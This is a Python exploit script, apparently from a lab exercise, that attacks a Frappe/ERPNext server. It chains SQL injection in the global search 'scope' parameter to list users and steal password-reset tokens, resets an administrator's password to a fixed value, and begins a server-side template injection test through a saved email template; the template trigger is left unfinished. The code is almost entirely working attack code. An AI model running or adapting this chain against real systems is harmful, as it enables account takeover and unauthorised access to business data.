import requests
import json
'''
global websearch returns responses in json
Ex
{
    'message': [
        {   
            'route': 'Administrator', 
            'relevance': 0,
            'name': '2',
            'content': '3',
            'title': '4',
            'doctype': '1'
        }, 
        {
            'route': 'zeljka.k@randomdomain.com',
            'relevance': 0,
            'name': '2',
            'content': '3',
            'title': '4',
            'doctype': '1'
        }
    ]
}

'''
def get_admin_users(session, url, proxies=None):
    data = {"cmd": "frappe.utils.global_search.web_search", "text": "donkey", "scope": "donkey_scope\"union all select 1,2,3,4, name COLLATE utf8mb4_general_ci FROM __Auth#"}
    res = None
    admin_users = []
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        for user in res.json()['message']:
            admin_users.append(user['route'])
        return admin_users
    else:
        print(F"Error in get_admin_users: {res.status_code}, {res.content}")
        exit(1)

def request_password_reset(session, url, user, proxies=None):
    data = {"cmd": "frappe.core.doctype.user.user.reset_password", "user": F"{user}"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        parsed = json.loads(json.loads(res.json()['_server_messages'])[0])
        return parsed['message'] == 'Password reset instructions have been sent to your email'
    else:
        print(F"Error in request_password_reset: {res.status_code}, {res.content}")
        exit(1)
def extract_password_reset_token(session, url, user, proxies=None):
    data = {"cmd": "frappe.utils.global_search.web_search", "text": "donkey", "scope": "donkey_scope\"union all select name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        reset_token = None
        for users in res.json()['message']:
            if user == users['doctype']:
                reset_token = users['route']
                break
        return reset_token
    else:
        print(F"Error in extract_password_reset_token: {res.status_code}, {res.content}")
        exit(1)
def reset_password(session, url, reset_token, username, password='@Donkey1234',proxies=None):
    url += '/update-password?key=qDObkZaaLmu9vkwqLaO4F07FbFDyKOxK'
    data = {"key": F"{reset_token}", "old_password": '', "new_password": F"{password}", "logout_all_sessions": "1", "cmd": "frappe.core.doctype.user.user.update_password"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        parsed = res.json()
        if 'home_page' in parsed:
            print(F'Username: {username}')
            print(F'Password: {password}')
        
    else:
        print(F"Error in reset_password: {res.status_code}, {res.content}")
        exit(1)
'''
def login(session, url, username, password='@Donkey1234', proxies=None):
    data = {"cmd": "login", "usr": F"{username}", "pwd": F"{password}", "device": "desktop"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        print('here',res.content)
        res1 = session.get(url + 'desk')
        #print(res1.content)

    else:
        print(F"Error logging in: {res.status_code}, {res.content}")
        exit(1)
'''
def create_email_template(session, url, proxies=None):
    url += 'api/method/frappe.desk.form.save.savedocs'
    template_name = "ssti_t23"
    ssti = "{{7*7}}"
    data = {
        "doc": "{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 1\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"zeljka.k@randomdomain.com\",\"__newname\":\"%s\",\"subject\":\"%s\",\"response\":\"<div>%s</div>\"}" % (template_name,template_name,ssti),
        "action": "Save"
        }
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    print(res.content)
    if res.status_code == 200:
        return template_name
    else:
        print(F"Error in create_email_template: {res.status_code}, {res.content}")
        exit(1)

def trigger_ssti_email_template(session, url, proxies=None):
    url += 'api/method/frappe.email.doctype.email_template.email_template.get_email_template'
    pass

if __name__ == '__main__':
    url = "http://erpnext:8000/"
    session = requests.session()
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    admin_users = get_admin_users(session, url)
    user = admin_users[1]
    print('Admin users: ', admin_users)
    request_password_reset(session, url, user)
    reset_token = extract_password_reset_token(session, url, user)
    reset_password(session, url, reset_token, user)
    #login(session, url, user)
    create_email_template(session, url)